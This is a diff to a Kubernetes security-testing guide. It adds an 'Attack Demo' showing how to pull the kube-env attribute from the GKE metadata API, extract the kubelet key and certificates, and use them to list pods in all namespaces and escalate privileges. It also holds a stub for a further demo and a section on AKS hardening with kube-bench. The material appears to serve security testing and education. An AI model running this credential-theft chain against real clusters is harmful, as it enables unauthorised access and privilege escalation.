@@ -172,6 +172,25 @@ $ curl -sk https://10.0.0.1:10250/run/kube-system/etcd-000/etcd-server -d "cmd=c
   * Enumerate and download locally all ecr docker images for baked in accounts and secrets.
   * Read all S3 contents => siphon all s3 bucket contents.
 
+#### Attack Demo #9 - GKE Metadata API Attribute 'kube-env'
+* In GKE, the `kube-env` attribute (like the user data endpoint on the api) is what the kubelet uses to bootstrap itself and get its keys from it.
+* Steps 1) Obtain kube-env script from metadata api, extract kubelet cresds, become kubelet, 2) Get pod list and enumerate privileged secrets, 3) Become highest privilege SA
+```bash
+$ curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/
+$ curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/user-data
+$ curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/kube-env
+$ curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/0.1/meta-data/attributes/kube-env | grep CERT
+# Next up, the ONE SHOT => Become the kubelet.
+$ curl -sLO https://storage.googleapis.com/kubernetes-release/release/$(curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt)/bin/linux/amd64/kubectl && chmod +x kubectl && mv kubectl /usr/local/bin && curl -s -H "X-Google-Metadata-Request: True" http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env | sed -e 's/^/export /g' | sed -e 's/: /=/g' | grep -v "EVICTION_HARD" | grep -v "EXTRA_DOCKER_OPTS" > kube-env.sh && . kube-env.sh && echo $KUBELET_KEY | base64 -d > client.pem && echo $KUBELET_CERT | base64 -d > client.crt && echo $CA_CERT | base64 -d > ca.crt && kubectl --certificate-authority=ca.crt --client-key=client.pem --client-certificate=client.crt --server https://$KUBERNETES_MASTER_NAME get pods --all-namespaces
+ 
+```
+
+#### Attack Demo #10 - 
+* Steps 1) , 2) , 3)
+```bash
+
+```
+
 ## AKS Security Testing
 We are going to start with locking down our AKS cluster using `kube-bench`. `kube-bench` applies a k8s security benchmark (from CIS)against the master and control plane components. It sets specific guidelines that help you secure your cluster setup. Since AKS is managed by Azure, we cannot run `kube-bench` against our master nodes, so everything in this section will be used only on worker nodes/non-master control plane components.
 * For an in-depth guide, go here: https://github.com/aquasecurity/kube-bench
